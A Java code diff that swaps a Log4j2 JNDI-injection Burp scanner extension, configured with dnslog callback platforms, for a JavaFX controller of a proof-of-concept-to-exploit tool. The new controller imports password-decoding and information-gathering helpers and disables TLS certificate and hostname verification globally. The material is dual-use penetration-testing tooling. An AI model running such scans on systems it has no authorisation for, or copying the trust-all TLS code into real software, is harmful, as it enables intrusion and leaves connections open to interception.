@@ -1,3105 +1,2445 @@
-package burp;
+package main;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.JSONObject;
+import com.alibaba.druid.filter.config.ConfigTools;
 import java.awt.*;
-import java.awt.event.MouseAdapter;
-import java.awt.event.MouseEvent;
 import java.io.*;
-import java.net.URL;
+import java.net.URLDecoder;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.*;
 import java.util.List;
-import java.util.concurrent.TimeUnit;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
+import java.io.FileWriter;
+import java.security.KeyManagementException;
+import java.security.NoSuchAlgorithmException;
+import java.security.cert.X509Certificate;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import javax.swing.*;
-import javax.swing.border.EmptyBorder;
-import javax.swing.table.AbstractTableModel;
-import javax.swing.table.TableModel;
-import okhttp3.Call;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
-import org.apache.commons.lang3.RandomStringUtils;
+import javafx.beans.value.ChangeListener;
+import javafx.beans.value.ObservableValue;
+import javafx.collections.FXCollections;
+import javafx.collections.ObservableList;
+import javafx.event.ActionEvent;
+import javafx.fxml.FXML;
+import javafx.fxml.FXMLLoader;
+import javafx.scene.Parent;
+import javafx.scene.Scene;
+import javafx.scene.control.*;
+import javafx.scene.control.Button;
+import javafx.scene.control.Label;
+import javafx.scene.control.TextArea;
+import javafx.scene.control.TextField;
+import javafx.scene.input.KeyEvent;
+import javafx.scene.input.MouseEvent;
+import javafx.scene.text.Text;
+import javafx.stage.FileChooser;
+import javafx.stage.Stage;
+import javax.net.ssl.*;
+import static main.RequestPoc.Poclist.*;
+import main.RequestPoc.Readfile;
+import static main.RequestPoc.Readfile.ymlFiletoconditioninformation;
+import static main.RequestPoc.Readfile.modifyFileContent;
+import static main.RequestPoc.makeRequest.listMakeRequest;
+import main.RequestPoc.test7;
+import static main.RequestPoc.test7.Url.extractLists;
+import static main.RequestPoc.test7.Url.extractListsinput;
+import static main.finalshelltest.finalshellDecode.decodePass;
+import static main.finalshelltest.seeyonGetpass.*;
+import static main.util.AEStest2.decryptbuwei;
+import static main.util.AEStest2.encryptbuwei;
+import static main.util.CorsJsonp.*;
+import static main.util.Tasklist.readFileByLines;
+import static main.util.Tasklist.ifexe;
+import static main.util.Tasklist.taskexechange;
+import static main.util.Usualcmd.readFilestokey;
+import static main.util.Usualcmd.readFileByLines2;
+import static main.util.Usualcmd.usualcmdlist;
+import static main.util.druidgetinformation.*;
+import static main.util.AESDESende.*;
+import static main.util.AEStest.*;
+import main.util.StageManager;
+import static main.util.encodeUtil.*;
+import static main.util.fileEncode.*;
+import static main.util.pythonexp.deleteArrayNull;
+import main.support.Expdecode;
+import main.support.SerializationDumper;
+
+
+public class Poc2ExpguiController {
+
+
+    // 解决https的问题 24-59行
+    // https://gist.github.com/aembleton/889392
+
+    static {
+        try {
+            Poc2ExpguiController.disableSSLCertificateChecking();
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        } catch (KeyManagementException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void disableSSLCertificateChecking() throws NoSuchAlgorithmException, KeyManagementException {
+        TrustManager[] trustAllCerts = new TrustManager[] {new X509TrustManager() {
+            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+                return null;
+            }
+            public void checkClientTrusted(X509Certificate[] certs, String authType) {
+            }
+            public void checkServerTrusted(X509Certificate[] certs, String authType) {
+            }
+        }
+        };
+        SSLContext sc = SSLContext.getInstance("SSL");
+        sc.init(null, trustAllCerts, new java.security.SecureRandom());
+        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+        HostnameVerifier allHostsValid = new HostnameVerifier(){
+            public boolean verify(String hostname, SSLSession session) {
+                return true;
+            }
+
+        };
+        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
+    }
+    // 修改的截止
+
+
+//    @FXML
+//    private Button mButton;
+//
+    @FXML
+    private Button mButton11;
+
+    @FXML
+    private TextArea mTextArea;
+
+    @FXML
+    private TextArea mTextArea2;
 
-public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController ,IContextMenuFactory{
-    //public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController {
-    private IBurpExtenderCallbacks callbacks;
+    @FXML
+    private TextArea mTextArea3;
 
-    private IExtensionHelpers helpers;
+    @FXML
+    private TextArea mTextArea4;
 
-    private PrintWriter stdout;
+    @FXML
+    private TextArea mTextArea5;
 
-    private static IContextMenuFactory contextMenuFactory;
+    @FXML
+    private TextArea mTextArea6;
 
-    private JSplitPane mjSplitPane;
+    @FXML
+    private TextArea mTextArea7;
 
-    private List<TablesData> Udatas = new ArrayList<>();
+    @FXML
+    private TextArea mTextArea8;
 
-    private IMessageEditor HRequestTextEditor;
+    @FXML
+    private TextArea mTextArea9;
 
-    private IMessageEditor HResponseTextEditor;
+    @FXML
+    private TextArea mTextArea92;
 
-    private IHttpRequestResponse currentlyDisplayedItem;
+    @FXML
+    private TextArea mTextArea10;
 
-    private URLTable Utable;
+    @FXML
+    private TextArea mTextArea12;
 
-    private JScrollPane UscrollPane;
+    @FXML
+    private TextArea mTextArea11;
 
-    private IHttpRequestResponse iHttpRequestResponse;
+    @FXML
+    private TextArea mTextArea13;
 
-    private JSplitPane HjSplitPane;
+    @FXML
+    private TextArea mTextArea14;
 
-    private JSplitPane ceye_pane;
+    @FXML
+    private TextArea mTextArea15;
 
-    private Label Label_lb;
+    @FXML
+    private TextArea mTextArea16;
 
-    private Button Button_bt;
+    @FXML
+    private TextArea mTextArea17;
 
-    private JSplitPane HjSplitPane2;
+    @FXML
+    private TextArea mTextArea18;
 
-    private JPanel mjPane;
+    @FXML
+    private TextArea mTextArea19;
 
-    private JTabbedPane Ltable;
+    @FXML
+    private TextArea mTextArea20;
 
-    private JTabbedPane Rtable;
+    @FXML
+    private TextArea mTextArea21;
 
-    private JTabbedPane Rtable2;
+    @FXML
+    private TextArea mTextArea22;
 
-    private JTextArea textArea1;
+    @FXML
+    private TextArea mTextArea24;
 
-    private JButton mbutton;
+    @FXML
+    private TextArea mTextArea25;
 
-    private JButton mbutton2;
+    @FXML
+    private TextArea mTextArea26;
 
-    private JTextArea textArea2;
+    @FXML
+    private TextArea mTextArea27;
 
-    private JPanel panel1;
+    @FXML
+    private TextArea mTextArea28;
+//    @FXML
+//    private TextArea mTextArea112;
 
-    private JCheckBox log4j2passivepattern_box;
+    @FXML
+    private TextArea mTextAreatest;
 
-    private JCheckBox isuseceye_box; // 是否使用ceye的dns平台
+    @FXML
+    private Label mLabel2;
 
-    private JCheckBox isuseprivatedns_box; // 是否使用自定义dns
+    @FXML
+    private Label mLabel4;
 
-    private JCheckBox isip_box; // 自定义dns是否为ip
+    @FXML
+    private Label mLabel5;
 
-    private JCheckBox isuseUserAgentTokenXff_CheckBox; //是否使用UA、Token、XFF扫描
+    @FXML
+    public Label mLabeltest;
 
-    private JCheckBox isuseXfflists_CheckBox; // 是否使用xff lists扫描
+    @FXML
+    public Label mLabeltest2;
 
-    private JCheckBox isuseAllCookie_CheckBox; // 是否全部cookie扫描
+    @FXML
+    private TextField mTextField1;
 
-    private JCheckBox isuseRefererOrigin_CheckBox; // 是否使用Contenttype、refer、origin扫描
+    @FXML
+    private TextField mTextField2;
 
-    private JCheckBox isuseContenttype_CheckBox; // 是否使用Contenttype、refer、origin扫描
+    @FXML
+    private TextField mTextField3;
 
-    private JCheckBox isuseAccept_CheckBox; // 是否使用Accept参数扫描
+    @FXML
+    private TextField mTextField4;
 
-    private JTextField fieldd1;  // jndi参数
+    @FXML
+    private TextField mTextField5;
 
-    private JComboBox fieldd2; // 协议名称dns ldap rmi
+    @FXML
+    private TextField mTextField51;
 
-    private JTextField field2; // ceye的token
+    @FXML
+    private TextField mTextField6;
 
-    private JTextField field3; // ceye平台的地址
+    @FXML
+    private TextField mTextField7;
 
-    private JTextField field22; // 自定义dnslog的地址
+    @FXML
+    private TextField mTextField8;
 
-    private JTextArea field33; // 自定义dnslog响应查看地址
+    @FXML
+    private TextField mTextField82;
 
-    private JTextArea whitelists_area;
+    @FXML
+    private TextField mTextField83;
 
-    private JTextArea customheaders_area;
+    @FXML
+    private TextField mTextField9;
 
-    public String logxn_dnslog;
+    @FXML
+    private TextField mTextField10;
 
-    public String logxn_dnslog_code;
+    @FXML
+    private TextField mTextField11;
 
-    public String logxn_dnslog_token;
+    @FXML
+    private TextField mTextField12;
 
-    private Boolean logxn ;
+    @FXML
+    private TextField mTextField13;
 
-    private Boolean burpdns;
+    @FXML
+    private TextField mTextField14;
 
-    private String burp_dnslog;
+    @FXML
+    private Text mText3;
 
-    private String dnslogcn ;
+    @FXML
+    private Text mText32;
 
-    private Boolean privatedns;
+    @FXML
+    private Text mText4;
 
-    private Boolean isip;
+    @FXML
+    private Text mText5;
 
-    private Boolean isipincreasing;
+    @FXML
+    private Text mText6;
 
-    private Boolean ceyeio ;
+    @FXML
+    private ListView<String> mListView1;
 
-    private String ceyetoken;
+    @FXML
+    private ListView<String> mListView2;
 
-    private String jarPath;
+    @FXML
+    private ListView<String> mListView3;
 
-    private String dnsldaprmi;
+    @FXML
+    private ListView<String> mListView4;
 
-    private Boolean isuseUserAgentTokenXff; //(是否测试UA头、X-Forward-for头以及X-Client-IP头)
+    @FXML
+    private ListView<String> mListView5;
 
-    private Boolean isuseXfflists; // 是否测试xff头参数
+//    private String tranDataToIndex;
 
-    private Boolean isuseAllCookie; //(是否全部cookie都进行测试)
+    @FXML
+    private RadioButton mRadiobutton;
 
-    private Boolean isuseRefererOrigin; // 是否测试Referer、Origin 参数
+    @FXML
+    private RadioButton mRadiobutton1;
 
-    private Boolean isuseContenttype; // 是否测试Content-Type 参数
+    @FXML
+    private RadioButton mRadiobutton2;
 
-    private Boolean isuseAccept; // 是否测试Accept-Language、Accept、Accept-Encoding 参数
+    @FXML
+    private RadioButton mRadiobutton3;
 
-    private String jndiparam; // jndi:   的点，可以自定义jndi:的bypass方式
+    @FXML
+    private RadioButton mRadiobutton4;
 
-//    private IBurpCollaboratorClientContext collaboratorContext;
+    @FXML
+    private RadioButton mRadiobutton5;
 
-    public void registerExtenderCallbacks ( IBurpExtenderCallbacks callbacks ) {
-        boolean isuseUserAgentTokenXff = true;
+    @FXML
+    private RadioButton mRadiobutton6;
 
-        boolean isuseXfflists = false;
+    @FXML
+    private RadioButton mRadiobutton7;
 
-        boolean isuseAllCookie = true;
+    @FXML
+    private RadioButton mRadiobutton8;
 
-        boolean privatedns = false;
+    @FXML
+    private RadioButton mRadiobutton9;
 
-        boolean isip = false;
+    @FXML
+    private RadioButton mRadiobutton10;
 
-        boolean isuseRefererOrigin = false;
+    @FXML
+    private RadioButton mRadiobutton11;
 
-        boolean isuseContenttype = false;
+    @FXML
+    private ChoiceBox mChoiceBox1; // aes/des/des3
 
-        boolean isuseAccept = false;
+    @FXML
+    private ChoiceBox mChoiceBox2;  // 向量模式
 
-        boolean isipincreasing = true;
+    @FXML
+    private ChoiceBox mChoiceBox3; // 填充模式
 
+    @FXML
+    private ChoiceBox mChoiceBox4; // 密文编码base64 / hex
 
-        String jndiparam = "jndi:";
+    @FXML
+    private ChoiceBox mChoiceBox5; // key和iv的编码 base64
 
-//        IBurpCollaboratorClientContext collaboratorContext = null ;
-        OkHttpClient client = new OkHttpClient();
-        String logxn_dnslog = "";
-        String logxn_dnslog_token = "";
-//        String burppayload = "";
-        Boolean logxn = true;
-        Boolean ceyeio = false;
-        String ceyetoken = "";
-        String dnsldaprmi = "dns";
-//        Boolean burpdns = true;
+    @FXML
+    private TextField mTextField20; // 密钥
 
+    @FXML
+    private TextField mTextField15; // 偏移量
+
+    @FXML
+    private TextArea mTextArea29; // 密文
+
+    @FXML
+    private TextArea mTextArea30; // 明文
+
+    @FXML
+    private TextArea mTextArea31; // 提取路径输入
+
+    @FXML
+    private TextArea mTextArea32; // 提取路径输入
+
+    @FXML
+    private TextArea mTextArea33; // 剔除的后缀
+
+    @FXML
+    private TextArea mTextArea34; // 匹配的关键字
+
+    @FXML
+    private TextArea mTextArea35; // base64 文件编码
+
+    @FXML
+    private TextArea mTextArea36; // byte数组 文件编码
+
+    @FXML
+    private TextArea mTextArea37; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea38_input; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea38; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea39; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea40; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea41; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea42; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea43; // bcel 文件编码
+
+    @FXML
+    private TextArea mTextArea44; // bcel 文件编码
+
+    // 初始化，可以加载poc到poc列表里
+    public void initialize() throws IOException {
+//        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+//        URL url=new URL("jar:file:" + jarPath + "!/1.txt");
+//        String pythonpath = readFileByLinesproperties(url);
+
+        Properties prop = new Properties();
+        prop.load(Main.class.getResourceAsStream("/config.properties"));
         String os = System.getProperty("os.name");
-        File f ;
-
-        if (os.toLowerCase().startsWith("win")) {
-            f = new File("log4j2burpscanner.properties");
-        }else{
-            String jarPath = callbacks.getExtensionFilename(); // 获取当前jar的路径
-            f = new File(jarPath.substring(0, jarPath.lastIndexOf("/")) + "/" + "log4j2burpscanner.properties");
-        }
-
-        if (!f.exists())
-        {
-            try {
-                f.createNewFile();
-                try (FileWriter fileWriter = new FileWriter(f)) {
-                    fileWriter.append("isuseceye=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("ceyetoken=xxxxxx");
-                    fileWriter.append("\n");
-                    fileWriter.append("ceyednslog=xxxx.ceye.io");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseprivatedns=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("isip=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("privatednslogurl=xxxx.xxx");
-                    fileWriter.append("\n");
-                    fileWriter.append("privatednsResponseurl=http://xxxx.xxx/?token=a");
-                    fileWriter.append("\n");
-                    fileWriter.append("jndiparam=jndi:");
-                    fileWriter.append("\n");
-                    fileWriter.append("dnsldaprmi=dns");
-                    fileWriter.append("\n");
-                    fileWriter.append("whitelists=*.gov.cn、*.edu.cn");
-                    fileWriter.append("\n");
-                    fileWriter.append("customlists=X-Client-IP、X-Requested-With、X-Api-Version");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseUserAgentTokenXff=1");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseXfflists=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseAllCookie=1");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseRefererOrigin=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseContenttype=0");
-                    fileWriter.append("\n");
-                    fileWriter.append("isuseAccept=0");
-                    fileWriter.append("\n");
-                    fileWriter.flush();
-                } catch (IOException e) { e.printStackTrace(); }
-            } catch (IOException e) { e.printStackTrace(); }
-        }
-        // 查询logxn是否可以访问
-        try{
-            String indexUrl = "https://log.xn--9tr.com/new_gen";
-            Request loginReq = new Request.Builder()
-                    .url(indexUrl)
-                    .get()
-                    .build();
-
-            Call call = client.newCall(loginReq);
-
-            try {
-                Robot  r   =   new   Robot();
-                r.delay(2000);
-            } catch (AWTException e) {
-                e.printStackTrace();
-            }
-
-            Response response = null;
-            try {
-                response = call.execute();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            String respCookie = null;
-            try {
-                respCookie = response.body().string();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            JSONObject jsonObject = JSON.parseObject(String.valueOf(respCookie));
-
-            logxn_dnslog = jsonObject.getString("domain"); // 读取domain，dnslog
-            logxn_dnslog = logxn_dnslog.substring(0,logxn_dnslog.length()-1);
-            logxn_dnslog_token = jsonObject.getString("token"); // 读取token，dnslog_token
-        }catch (Exception e){
-            logxn_dnslog = "log.xn--9tr.com can't access,need to configure ceye api";
-            logxn_dnslog_token = "log.xn--9tr.com can't access,need to configure ceye api";
-            logxn = false;
-        }
-
-        // 生成burp自身的dnslog
-//        try {
-//            collaboratorContext = callbacks.createBurpCollaboratorClientContext();
-//            burp_dnslog = collaboratorContext.generatePayload(true);
-//        }catch (Exception e){
-//            burp_dnslog = "burp dnslog 生成失败";
-//            burpdns = false;
-//        }
-        this.isuseUserAgentTokenXff = isuseUserAgentTokenXff; // 是否测试UA头、X-Forward-for头以及X-Client-IP头
-        this.isuseXfflists = isuseXfflists; // 是否用xff列表测试，包含其他标识IP头
-        this.isuseAllCookie = isuseAllCookie; // 是否全部cookie都进行测试
-        this.logxn_dnslog_code = logxn_dnslog;
-        this.logxn_dnslog = logxn_dnslog;
-        this.logxn_dnslog_token = logxn_dnslog_token;
-        this.logxn = logxn ;
-        this.ceyeio = ceyeio ;
-        this.isip = isip;
-        this.isipincreasing = isipincreasing;
-        this.isuseRefererOrigin = isuseRefererOrigin;
-        this.isuseContenttype = isuseContenttype;
-        this.isuseAccept = isuseAccept;
-        this.jndiparam = jndiparam;
-        this.dnsldaprmi = dnsldaprmi;
-        this.privatedns = privatedns;
-//        this.burpdns = burpdns ;
-        this.ceyetoken = ceyetoken;
-        this.callbacks = callbacks;
-        this.helpers = callbacks.getHelpers();
-        this.stdout = new PrintWriter(callbacks.getStdout(), true);
-        callbacks.setExtensionName("log4j2burpscanner");
-        this.stdout.println("===========================");
-        this.stdout.println("[+]   load successful!     ");
-        this.stdout.println("[+] log4j2burpscanner v0.18.6");
-        this.stdout.println("[+]      code by f0ng      ");
-        this.stdout.println("===========================");
-
-//        this.stdout.println("burp的dnslog为" + burp_dnslog);
-
-        this.stdout.println("dns address : " + this.logxn_dnslog);
-        this.stdout.println("dns token : " + this.logxn_dnslog_token);
-
-        if (this.logxn_dnslog.contains("configure ceye api")){
-
+        if(os.toLowerCase().startsWith("win")) {
+            String pythonpath = readFileByLinesproperties("property/config.properties");
+            String[] pythonpaths = pythonpath.split("###");
+            mTextField8.setText(pythonpaths[0]);
+            mTextField82.setText(pythonpaths[1]);
+            mTextField9.setText(pythonpaths[2]);
+            mTextField83.setText(pythonpaths[3]);
         }else {
-            this.stdout.println("You also can request to    https://log.xn--9tr.com/" + this.logxn_dnslog_token + "    to see dnslog");
+            System.out.println(prop.getProperty("pocsuite"));
+            mTextField8.setText(prop.getProperty("python2path"));
+            mTextField82.setText(prop.getProperty("python3path"));
+            mTextField83.setText(prop.getProperty("pocsuite"));
+            mTextField9.setText(prop.getProperty("cspayload"));
+
         }
 
-        String finalLogxn_dnslog1 = this.logxn_dnslog;
-        String finalLogxn_dnslog_token = this.logxn_dnslog_token;
-        SwingUtilities.invokeLater(new Runnable() {
-            public void run() {
-                BurpExtender.this.textArea1 = new JTextArea("");
-                BurpExtender.this.mjSplitPane = new JSplitPane(0); //上下
-                BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);
-
-                BurpExtender.this.Utable.getColumnModel().getColumn(0).setPreferredWidth(2); //  URL
-                BurpExtender.this.Utable.getColumnModel().getColumn(1).setPreferredWidth(2); //  METHOD
-                BurpExtender.this.Utable.getColumnModel().getColumn(3).setPreferredWidth(2); //  status
-
-                BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
-                BurpExtender.this.HjSplitPane = new JSplitPane();
-                BurpExtender.this.HjSplitPane2 = new JSplitPane();
-
-                BurpExtender.this.HjSplitPane.setDividerLocation(550);
-                BurpExtender.this.mjSplitPane.setDividerLocation(230);
-                BurpExtender.this.Ltable = new JTabbedPane();
-                BurpExtender.this.HRequestTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
-                BurpExtender.this.Ltable.addTab("Request", BurpExtender.this.HRequestTextEditor.getComponent());
-                BurpExtender.this.Rtable = new JTabbedPane();
-
-                BurpExtender.this.Rtable2 = new JTabbedPane();
-
-                JPanel panel = new JPanel(); // 创建一个dnslog页面，进行配置dnslog
-                panel.setAlignmentX(0.0f);
-                panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
-                panel.setBorder(new EmptyBorder(10, 10, 10, 10));
-
-                JPanel panel12 = new JPanel();
-                panel12.setBorder(BorderFactory.createTitledBorder("log4j2 switch")); // ceye的配置
-                panel12.setLayout(new BoxLayout(panel12, BoxLayout.X_AXIS));
-
-                JPanel panel2 = new JPanel();
-                panel2.setBorder(BorderFactory.createTitledBorder("ceye config")); // ceye的配置
-                panel2.setLayout(new BoxLayout(panel2, BoxLayout.X_AXIS));
-
-                JPanel panel22 = new JPanel();
-                panel22.setBorder(BorderFactory.createTitledBorder("other dnslog config")); // ceye的配置
-                panel22.setLayout(new BoxLayout(panel22, BoxLayout.X_AXIS));
-
-                JPanel panel3 = new JPanel();
-                panel3.setLayout(new BoxLayout(panel3, BoxLayout.X_AXIS));
-
-                JButton btn1 = new JButton("Save configuration");
-                btn1.addMouseListener(new MouseAdapter() {
-
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-
-                        String total = "";
-//                        if (log4j2passivepattern_box.isSelected()){ //写入是否使用log4j2被动扫描 参数
-//                            total = total + "uselog4j2=1\n";
-//                        }else{
-//                            total = total + "uselog4j2=0\n";
-//                        }
-                        if (isuseceye_box.isSelected()){ //写入isuseceye参数
-                            total = total + "isuseceye=1\n";
-                        }else{
-                            total = total + "isuseceye=0\n";
-                        }
-                        total = total + "ceyetoken=" + field2.getText().trim() + "\n"; // 写入ceye token参数
-                        total = total + "ceyednslog=" + field3.getText().trim() + "\n"; // 写入ceye 平台记录的地址
-
-                        if (isuseprivatedns_box.isSelected()){ // 写入isuseprivatedns参数
-                            total = total + "isuseprivatedns=1\n";
-                        }else{ total = total + "isuseprivatedns=0\n"; }
-
-                        if (isip_box.isSelected()){ // 写入isip参数
-                            total = total + "isip=1\n";
-                        }else{ total = total + "isip=0\n"; }
-
-                        total = total + "privatednslogurl=" + field22.getText().trim() + "\n"; // 写入自定义dnslog参数
-                        total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
-                        total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
-                        total = total + "dnsldaprmi=" + Objects.requireNonNull(fieldd2.getSelectedItem()).toString().trim() + "\n"; // 写入协议名称dns ldap rmi
-                        total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入白名单
-                        total = total + "customlists=" + customheaders_area.getText().replace("\n","、").trim() + "\n"; // 写入自定义参数
-
-                        if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
-                            total = total + "isuseUserAgentTokenXff=1\n";
-                        }else{ total = total + "isuseUserAgentTokenXff=0\n"; }
-
-                        if (isuseXfflists_CheckBox.isSelected()){ // 写入isuseXfflists参数
-                            total = total + "isuseXfflists=1\n";
-                        }else{ total = total + "isuseXfflists=0\n"; }
-
-                        if (isuseAllCookie_CheckBox.isSelected()){ // 写入isuseAllCookie参数
-                            total = total + "isuseAllCookie=1\n";
-                        }else{ total = total + "isuseAllCookie=0\n"; }
-
-                        if (isuseRefererOrigin_CheckBox.isSelected()){ // 写入isuseRefererOrigin参数
-                            total = total + "isuseRefererOrigin=1\n";
-                        }else{
-                            total = total + "isuseRefererOrigin=0\n"; }
-
-                        if (isuseContenttype_CheckBox.isSelected()){ // 写入Contenttype参数
-                            total = total + "isuseContenttype=1\n";
-                        }else{
-                            total = total + "isuseContenttype=0\n"; }
-
-                        if (isuseAccept_CheckBox.isSelected()){ // 写入isuseAccept参数
-                            total = total + "isuseAccept=1\n";
-                        }else{ total = total + "isuseAccept=0\n"; }
-
-                        try (FileWriter fileWriter = new FileWriter(f.getAbsolutePath())) {
-                            fileWriter.append(total);
-                        } catch (IOException ee) {
-                            ee.printStackTrace();
-                        }
-                        String use_dnslog = "";
-
-                        if (total.contains("isuseceye=1"))
-                            use_dnslog = FileGetValue(f,"ceyednslog");
-                        else if (total.contains("isuseprivatedns=1"))
-                            use_dnslog = FileGetValue(f,"privatednslogurl");
-                        else
-                            use_dnslog = finalLogxn_dnslog1;
-
-                        String Content = "";// 按钮返回的内容
-                        Content = "Save Success!\nyou use dnslog is :" + use_dnslog;
-                        if (use_dnslog.contains("need to configure ceye api"))
-                            Content = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
-
-                        JOptionPane.showMessageDialog(null, Content , "Save", JOptionPane.INFORMATION_MESSAGE);
-
-
-                    }
-                });
-
-                JButton btn2 = new JButton("Restore/Loading latest params");
-                btn2.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-                        BurpExtender.this.log4j2passivepattern_box.setSelected(true);
-                        BurpExtender.this.isuseceye_box.setSelected(false);
-                        BurpExtender.this.isuseprivatedns_box.setSelected(false);
-                        BurpExtender.this.isip_box.setSelected(false);
-                        BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
-                        BurpExtender.this.isuseXfflists_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseAllCookie_CheckBox.setSelected(true);
-                        BurpExtender.this.isuseRefererOrigin_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseContenttype_CheckBox.setSelected(false);
-                        BurpExtender.this.isuseAccept_CheckBox.setSelected(false);
-
-                        fieldd1.setText("jndi:");
-                        fieldd2.setSelectedIndex(0);
-                        field2.setText("xxxxxxxxxx");
-                        field3.setText("xxxxx.ceye.io");
-                        field22.setText("x.x.x.x");
-                        field33.setLineWrap(true);
-                        field33.setText("http://x.x.x.x/repoonsetoken=[token]");
-                        whitelists_area.setText("*.gov.cn\n*.edu.cn");
-                        customheaders_area.setText("X-Client-IP\nX-Requested-With\nX-Api-Version");
-                    }
-                });
-
-                JButton btn3 = new JButton("Test dnslog delay");
-                btn3.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-                        String use_dnslog;
-                        String testContent = "";
-                        use_dnslog = finalLogxn_dnslog1;
-                        try {
-                            if (!isuseceye_box.isSelected() && isuseprivatedns_box.isSelected()) {
-                                String privatednsurl = field33.getText().trim();
-                                long start = System.currentTimeMillis();
-                                OkHttpClient client = new OkHttpClient();
-                                String indexUrl = privatednsurl;
-                                Request loginReq = new Request.Builder()
-                                        .url(indexUrl)
-                                        .get()
-                                        .build();
-                                Call call = client.newCall(loginReq);
-                                Response response = null;
-                                try {
-                                    response = call.execute();
-                                } catch (IOException ex) {
-                                    ex.printStackTrace();
-                                }
-                                long end = System.currentTimeMillis();
-                                testContent = indexUrl +"\n" + (end - start) + "ms";
-
-                            } else if (isuseceye_box.isSelected()) {
-                                String ceyetoken = field2.getText().trim();
-                                String ceyeurl = "http://api.ceye.io/v1/records?token=" + ceyetoken + "&type=dns&filter=";
-                                long start = System.currentTimeMillis();
-                                OkHttpClient client = new OkHttpClient();
-                                String indexUrl = ceyeurl;
-                                Request loginReq = new Request.Builder()
-                                        .url(indexUrl)
-                                        .get()
-                                        .build();
-                                Call call = client.newCall(loginReq);
-                                Response response = null;
-                                try {
-                                    response = call.execute();
-                                } catch (IOException ex) {
-                                    ex.printStackTrace();
-                                }
-                                long end = System.currentTimeMillis();
-                                testContent = indexUrl +"\n" +  (end - start) + "ms";
-
-                            } else if (use_dnslog.contains("need to configure ceye api")) {
-                                testContent = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
-                            } else {
-                                String ceyeurl = "https://log.xn--9tr.com/" + finalLogxn_dnslog_token;
-                                long start = System.currentTimeMillis();
-                                OkHttpClient client = new OkHttpClient();
-                                String indexUrl = ceyeurl;
-                                Request loginReq = new Request.Builder()
-                                        .url(indexUrl)
-                                        .get()
-                                        .build();
-                                Call call = client.newCall(loginReq);
-                                Response response = null;
-                                try {
-                                    response = call.execute();
-                                } catch (IOException ex) {
-                                    ex.printStackTrace();
-                                }
-                                long end = System.currentTimeMillis();
-                                testContent =  indexUrl +"\n" + (end - start) + "ms";
-                            }
-                        }catch (Exception ee){
-                            testContent = "can't access";
-                        }
-                        testContent = testContent + "\nIf the delay exceeds 1200ms, please check the dnslog platform manually\n";
-                        JOptionPane.showMessageDialog(null, testContent , "Test", JOptionPane.INFORMATION_MESSAGE);
-
-                    }
-                });
-
-                JLabel label12 = new JLabel("log4j2 Passive Scanner:");
-                BurpExtender.this.log4j2passivepattern_box = new JCheckBox(); // 是否使用ceye
-
-                JLabel label1 = new JLabel("isuseceye:");
-                BurpExtender.this.isuseceye_box = new JCheckBox(); // 是否使用ceye
-
-                JLabel label2 = new JLabel("ceyetoken:");
-                BurpExtender.this.field2 = new JTextField(); // ceye的token
-
-                JLabel label3 = new JLabel("ceyednslog:");
-                BurpExtender.this.field3 = new JTextField(); // ceye平台的地址
-
-
-                JLabel label11 = new JLabel("isuseprivatedns:");
-                BurpExtender.this.isuseprivatedns_box = new JCheckBox(); // 是否使用自定义dnslog
-
-                isuseceye_box.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-                        isuseprivatedns_box.setSelected(false);
-                    }
-                });
-
-                isuseprivatedns_box.addMouseListener(new MouseAdapter() {
-                    @Override
-                    public void mouseClicked(MouseEvent e){
-                        isuseceye_box.setSelected(false);
-                    }
-                });
-
-                JLabel label111 = new JLabel("isip:");
-                BurpExtender.this.isip_box = new JCheckBox(); // 是否使用自定义dnslog
-
-                JLabel label22 = new JLabel("privatednslogurl:");
